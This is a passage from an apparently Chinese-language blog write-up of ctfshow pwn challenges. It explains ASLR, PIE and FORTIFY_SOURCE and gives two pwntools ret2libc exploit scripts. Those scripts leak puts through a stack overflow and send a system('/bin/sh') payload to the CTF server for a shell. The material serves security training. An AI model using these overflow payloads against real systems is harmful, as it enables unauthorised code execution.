</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28162</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;pwn1&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x88</span> <span class="o">+</span> <span class="mh">0x4</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># payload：0x88+0x4个无用填充字符覆盖到返回地址，</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数，</span>
</span></span><span class="line"><span class="cl"><span class="c1"># main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞</span>
</span></span><span class="line"><span class="cl"><span class="c1"># puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 接收puts函数输出的puts函数在内存的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 在根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">,</span><span class="n">puts_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 使用libc.dump(&#34;system&#34;)找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 使用libc.dump(&#34;str_bin_sh&#34;)找到libc中的&#34;/bin/sh&#34;字符串地址，再加上基地址就得到&#34;/bin/sh&#34;字符串在内存的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 最后填入system的参数“/bin/sh”</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="pwn26">pwn26
</h2><p><img src="/p/ctfshow-pwn/image-20250301151646333.png"
	width="1714"
	height="821"
	srcset="/p/ctfshow-pwn/image-20250301151646333_hu_30239d4119899274.png 480w, /p/ctfshow-pwn/image-20250301151646333_hu_5672cec098e110ab.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="208"
		data-flex-basis="501px"
	
></p>
<p>SLR（Address Space Layout Randomization）是一种计算机安全机制，旨在增加恶意攻击者在系统上成功执行攻击的难度。ASLR通过随机化进程的地址空间布局来防止攻击者依赖于已知的内存地址，从而增加了攻击的复杂性。ASLR可以随机化以下组件的位置：</p>
<pre><code>栈：包含函数调用和局部变量的区域。
堆：用于动态分配内存的区域。
共享库：动态链接的共享库的加载地址。
代码段：包含程序指令的区域。
</code></pre>
<p>在 Linux 系统中，/proc/sys/kernel/randomize_va_space 是一个控制和查看ASLR的接口文件。</p>
<p>/proc/sys/kernel/randomize_va_space 可以具有以下值：</p>
<p>0：表示 ASLR 被禁用。在这种情况下，进程的地址空间将不会随机化，各个组件的地址位置将是固定的。</p>
<p>1：表示 ASLR 已启用，但只会对共享库的地址进行随机化。即在每次运行时，共享库的加载地址会发生变化，而进程的栈、堆和代码段的地址位置仍然是固定的。</p>
<p>2：表示 ASLR 已启用，对进程的地址空间中的所有组件（包括栈、堆、共享库和代码段）进行完全随机化。这是最安全的设置，因为每次运行时，进程的所有组件的地址位置都会发生变化。</p>
<h2 id="pwn29">pwn29
</h2><p>PIE全称是position-independent executable，中文解释为地址无关可执行文件，该技术是一个针对代码段（.text）、数据段（.data）、未初始化全局变量段（.bss）等固定地址的一个防护技术，如果程序开启了PIE保护的话，在每次加载程序时都变换加载地址，从而不能通过ROPgadget等一些工具来帮助解题。在PIE和ASLR同时开启的情况下，攻击者将对程序的内存布局一无所知，大大增加了利用难度。然而在增加安全性的同时，PIE也会一定程度上影响性能，因此在大多数操作系统上PIE仅用于一些对安全性要求比较高的程序。
<img src="/p/ctfshow-pwn/image-20250301153252889.png"
	width="1764"
	height="390"
	srcset="/p/ctfshow-pwn/image-20250301153252889_hu_a4b57a26fafec2d5.png 480w, /p/ctfshow-pwn/image-20250301153252889_hu_c7cef108288e1c98.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="452"
		data-flex-basis="1085px"
	
></p>
<p><img src="/p/ctfshow-pwn/image-20250301153321757.png"
	width="2160"
	height="890"
	srcset="/p/ctfshow-pwn/image-20250301153321757_hu_eeca942e40f99591.png 480w, /p/ctfshow-pwn/image-20250301153321757_hu_e7215a19cf904032.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="582px"
	
></p>
<p><img src="/p/ctfshow-pwn/image-20250301153350301.png"
	width="740"
	height="293"
	srcset="/p/ctfshow-pwn/image-20250301153350301_hu_98b234fae6be7ca6.png 480w, /p/ctfshow-pwn/image-20250301153350301_hu_7d10b86953a203b3.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="252"
		data-flex-basis="606px"
	
></p>
<p>可以看到executable:后面输出的是main函数的地址，由于PIE保护，已经发生了变化</p>
<h2 id="pwn30">pwn30
</h2><p><img src="/p/ctfshow-pwn/image-20250301153934320.png"
	width="1206"
	height="274"
	srcset="/p/ctfshow-pwn/image-20250301153934320_hu_990f19d9adc8c603.png 480w, /p/ctfshow-pwn/image-20250301153934320_hu_9ffdc34dd1972c81.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="440"
		data-flex-basis="1056px"
	
></p>
<p>溢出漏洞，用ret2libc,用于绕过栈溢出漏洞等缓冲区溢出漏洞的防御措施（比如NX防御机制），以实现代码执行或提升攻击者权限。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">from</span> <span class="n">pwn</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">from</span> <span class="n">LibcSearcher</span> <span class="n">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 打印调试信息</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 建立连接</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;pwn.challenge.ctf.show&#34;</span><span class="p">,</span> <span class="s2">&#34;28309&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./pwn&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 溢出偏移地址</span>
</span></span><span class="line"><span class="cl"><span class="n">offset</span> <span class="o">=</span> <span class="mh">0x88</span> <span class="o">+</span> <span class="mh">0x4</span>
</span></span><span class="line"><span class="cl"><span class="c1"># main函数地址</span>
</span></span><span class="line"><span class="cl"><span class="n">main_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;main&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># plt表中puts函数地址</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_plt</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">plt</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="c1"># got表中puts函数的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># payload：0x88+0x4个无用填充字符覆盖到返回地址，</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数，</span>
</span></span><span class="line"><span class="cl"><span class="c1"># main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞</span>
</span></span><span class="line"><span class="cl"><span class="c1"># puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">main_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 发送payload</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 接收puts函数输出的puts函数在内存的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># 根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">LibcSearcher</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">,</span> <span class="n">puts_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址</span>
</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;puts&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 使用libc.dump(&#34;system&#34;)找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;system&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 使用libc.dump(&#34;str_bin_sh&#34;)找到libc中的&#34;/bin/sh&#34;字符串地址，再加上基地址就得到&#34;/bin/sh&#34;字符串在内存的地址</span>
</span></span><span class="line"><span class="cl"><span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">dump</span><span class="p">(</span><span class="s2">&#34;str_bin_sh&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4</span>
</span></span><span class="line"><span class="cl"><span class="c1"># 最后填入system的参数“/bin/sh”</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">offset</span> <span class="o">*</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">4</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">binsh_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>哎，有些难理解</p>
<h2 id="pwn32">pwn32
</h2><p>Fortify功能</p>
<p>在使用FORTIFY_SOURCE功能的编译器环境中，当检测到潜在的缓冲区溢出或其他内存错误时，编译器会自动替换对应的不安全C库函数（例如strcpy，memcpy等）调用为更安全的版本。这些安全版本的函数在执行前会进行一些边界检查，以确保不会发生缓冲区溢出。</p>
<p>此外，FORTIFY_SOURCE还会对格式化字符串函数（如printf、scanf等）的参数进行检查，以确保其格式化字符串参数与实际参数的类型匹配，从而避免格式化字符串漏洞。</p>
<p>本质上一种检查和替换机制，对GCC和glibc的一个安全补丁，目前支持memcpy, memmove, memset, strcpy, strncpy, strcat, strncat,sprintf, vsprintf, snprintf, vsnprintf, gets等。</p>
<p>·FORTIFY_SOURCE=0: 这是Fortify Source功能的默认级别，也就是禁用状态。</p>
<p>·FORTIFY_SOURCE=1: 这是第一个启用级别。如果编译器在编译时检测到潜在的缓冲区溢出或其他内存错误，它将生成一个运行时检查的警告，但程序仍然会继续执行。例如，会将strcpy替换为__strcpy_chk，memcpy替换为__memcpy_chk等。</p>
<p>·FORTIFY_SOURCE=2: 这是最高级别的启用。如果编译器在编译时检测到潜在的缓冲区溢出或内存错误，它将生成一个运行时检查的错误，并且程序的执行将被终止</p>
<p><img src="/p/ctfshow-pwn/image-20250301171915204.png"
	width="1919"
	height="888"
	srcset="/p/ctfshow-pwn/image-20250301171915204_hu_b5df67fb215e4d38.png 480w, /p/ctfshow-pwn/image-20250301171915204_hu_32dae61b35072527.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="216"
		data-flex-basis="518px"
	
></p>
<p>fgets(char *str, int n, FILE *stream) 从指定的流 stream 读取一行，并把它存储在 <strong>str</strong> 所指向的字符串内，n是要读取的最大字符串长度</p>
<p>getgid()用来取得执行目前进程的组识别码</p>
<p>strtol() 函数将字符串转换为长整数值</p>
<p>*(_QWORD *)作为一个整体，通常用于将一个地址（或其他整数）转换为一个指向64位无符号整数的指针，并获取该地址上的值。</p>
<p>memcpy(void *str1, const void *str2, size_t n) 从存储区 <strong>str2</strong> 复制 <strong>n</strong> 个字节到存储区 <strong>str1</strong></p>
<h3 id="对函数的解释">对函数的解释
</h3><p>main函数三个参数，argc是命令行参数的数量，argv是命令行字符串数组，envp是环境变量数组</p>
<p>setresgid(v3, v3, v3)：将当前进程的真实 GID、有效 GID 和保存的 GID 都设置为v3的值</p>
<ul>
<li><strong><code>v4 = argv[1]</code></strong>：将第一个命令行参数赋值给 <code>v4</code>。</li>
<li><strong><code>\*(_QWORD \*)buf1 = \*(_QWORD \*)v4</code></strong>：将 <code>v4</code> 的前 8 个字节复制到 <code>buf1</code> 中。（QWORD八个字节）</li>
<li><strong><code>\*(_WORD \*)&amp;buf1[8] = \*((_WORD \*)v4 + 4)</code></strong>：将 <code>v4</code> 的第 9 和第 10 个字节复制到 <code>buf1</code> 的第 9 和第 10 个位置。（WORD两个字节）</li>
<li><strong><code>buf1[10] = v4[10]</code></strong>：将 <code>v4</code> 的第 11 个字节复制到 <code>buf1</code> 的第 11 个位置。</li>
<li><strong>作用</strong>：将 <code>argv[1]</code> 的内容复制到 <code>buf1</code> 中。</li>
</ul>
<p><img src="/p/ctfshow-pwn/image-20250301173019535.png"
	width="2047"
	height="583"
	srcset="/p/ctfshow-pwn/image-20250301173019535_hu_b90c97c1e6f522c2.png 480w, /p/ctfshow-pwn/image-20250301173019535_hu_2c2ce22c23077712.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="351"
		data-flex-basis="842px"
	
></p>
<ol>
<li>处理命令行参数，将其复制到缓冲区中。</li>
<li>打印缓冲区内容。</li>
<li>从标准输入读取数据并打印。</li>
<li>检查命令行参数数量，如果超过 4 个，调用未定义函数。</li>
</ol>
<h2 id="pwn33">pwn33
</h2><p>现在FORTIFY_SOURCE=1，即Fortify  功能已启用。附件是64位elf，用IDA打开，可以看到上题中的strcpy被替换为__strcpy_chk，memcpy被替换为__memcpy_chk，也加上了11LL的限制防止溢出，这是第一级Fortify的特征</p>
<ul>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">`</span><span class="nf">__memcpy_chk</span><span class="p">(</span><span class="n">buf1</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="n">v5</span><span class="p">,</span><span class="w"> </span><span class="mi">11</span><span class="n">LL</span><span class="p">)</span><span class="o">`</span><span class="w"> </span><span class="err">中：</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="w"> </span><span class="o">**`</span><span class="n">buf1</span><span class="o">`**</span><span class="err">：目标缓冲区，数据将被复制到这里。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="w"> </span><span class="o">**`</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">`**</span><span class="err">：源缓冲区，数据从这里复制（通常是命令行参数的第二个参数）。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="w"> </span><span class="o">**`</span><span class="n">v5</span><span class="o">`**</span><span class="err">：要复制的字节数。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">-</span><span class="w"> </span><span class="o">**`</span><span class="mi">11</span><span class="n">LL</span><span class="o">`**</span><span class="err">：目标缓冲区</span><span class="w"> </span><span class="o">`</span><span class="n">buf1</span><span class="o">`</span><span class="w"> </span><span class="err">的实际大小（</span><span class="mi">11</span><span class="w"> </span><span class="err">字节）。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">__memcpy_chk</span><span class="w"> </span><span class="err">的功能是将</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="w"> </span><span class="err">中的</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="err">个字节复制到</span><span class="w"> </span><span class="n">buf1</span><span class="w"> </span><span class="err">中，但在复制之前会检查目标缓冲区</span><span class="w"> </span><span class="n">buf1</span><span class="w"> </span><span class="err">的大小是否足够：</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">如果</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="err">超过了</span><span class="w"> </span><span class="n">buf1</span><span class="w"> </span><span class="err">的大小（</span><span class="mi">11</span><span class="w"> </span><span class="err">字节），</span><span class="n">__memcpy_chk</span><span class="w"> </span><span class="err">会触发缓冲区溢出保护机制，终止程序并输出错误信息。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">如果</span><span class="w"> </span><span class="n">v5</span><span class="w"> </span><span class="err">小于或等于</span><span class="w"> </span><span class="n">buf1</span><span class="w"> </span><span class="err">的大小，则正常执行复制操作。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">__strcpy_chk</span><span class="w"> </span><span class="err">的功能是将</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="err">中的字符串复制到</span><span class="w"> </span><span class="n">buf2</span><span class="w"> </span><span class="err">中，但在复制之前会检查目标缓冲区</span><span class="w"> </span><span class="n">buf2</span><span class="w"> </span><span class="err">的大小是否足够：</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">如果</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="err">的长度（包括字符串结束符</span><span class="w"> </span><span class="err">\</span><span class="mi">0</span><span class="err">）超过了</span><span class="w"> </span><span class="n">buf2</span><span class="w"> </span><span class="err">的大小（</span><span class="mi">11</span><span class="w"> </span><span class="err">字节），</span><span class="n">__strcpy_chk</span><span class="w"> </span><span class="err">会触发缓冲区溢出保护机制，终止程序并输出错误信息。</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="err">如果</span><span class="w"> </span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="err">的长度小于或等于</span><span class="w"> </span><span class="n">buf2</span><span class="w"> </span><span class="err">的大小，则正常执行复制操作。</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div></li>
</ul>
<p>前者是带缓冲区的内存复制函数，后者是带缓冲区的字符串复制函数</p>
<h2 id="pwn34">pwn34
</h2><p>此时FORTIFY_SOURCE=2，启用了第二级Fortify，用IDA打开附件查看，此时printf函数也被替换成了__printf_chk，Undefined函数前的if条件也没了</p>
<h2 id="pwn35">pwn35
</h2><p>sprintf就是把格式化的数据写入到某个字符串中。返回值字符串的长度。</p>
<p>fprintf()函数根据指定的format(格式)发送信息(参数)到由stream(流)指定的文件.因此fprintf()可以使得信息输出到指定的文件。</p>
<p>stdout, stdin, stderr的中文名字分别是标准输出，标准输入和标准错误。</p>
<p>stdout是行缓冲的，他的输出会放在一个buffer里面，只有到换行的时候，才会输出到屏幕。而stderr是无缓冲的，会直接输出，</p>
<p>fflush()刷新缓冲区</p>
<p>注意到signal(11, (__sighandler_t)sigsegv_handler);Signal 11错误，也称为“Segmentation fault”，是一种用于提示Unix系统程序出现错误的信号。当应用程序试图对无权访问的内存地址进行读写操作时,会调用 sigsegv_handler 函数,sigsegv_handler 函数 会把stderr打印输出,即将flag的值打印输出那么我们直接输入超长数据就会溢出，程序就会崩溃进而打印出flag
strcpy函数（strcpy函数没有长度限制）这个函数是一个典型的可以用来利用溢出的函数。所以我们可以在这里进行栈溢出。</p>
<p><img src="/p/ctfshow-pwn/image-20250302172158557.png"
	width="890"
	height="228"
	srcset="/p/ctfshow-pwn/image-20250302172158557_hu_ad913b62430e2044.png 480w, /p/ctfshow-pwn/image-20250302172158557_hu_21c8acd8499e0175.png 1024w"
	loading="lazy"
	
	
